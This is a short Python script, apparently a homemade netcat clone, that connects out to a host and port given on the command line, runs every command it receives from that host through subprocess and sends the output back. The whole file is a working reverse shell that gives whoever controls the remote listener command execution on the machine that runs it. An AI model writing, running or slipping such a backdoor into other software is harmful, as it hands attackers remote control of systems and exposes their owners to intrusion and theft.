import subprocess
import optparse
import sys
import socket

class MyNetCat:
    def __init__(self) -> None:
        self.target = self.get_params()[0]
        self.port = self.get_params()[1]
        try:
            self.s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # self.s_socket.settimeout(2)
            self.s_socket.connect((self.target, self.port))
            print('Connected successfully!')
        except Exception as e:
            print('Failed to connect server', e)
            sys.exit()

    def get_params(self):
        parser = optparse.OptionParser('Usage: ./%s -t target -p port' % sys.argv[0])
        parser.add_option('-t', '--target', dest='target', type='string', help='Specify target to connect')
        parser.add_option('-p', '--port', dest='port', type='int', help='Specify port')
        options, args = parser.parse_args()
        if options.target is None or options.port is None:
            print(parser.usage)
            sys.exit()
        return options.target, options.port

    def run(self):
        while True:
            data = self.s_socket.recv(1024)
            if len(data) == 0:
                break
            elif data.decode('utf-8').strip() == 'exit':
                self.s_socket.close()
                break
            else:
                try:
                    execution_result = subprocess.check_output(data.decode('utf-8').split())
                    self.s_socket.send(execution_result)
                except:
                    self.s_socket.send('Failed to execute'.encode('utf-8'))

if __name__ == '__main__':
    mynetcat = MyNetCat()
    mynetcat.run()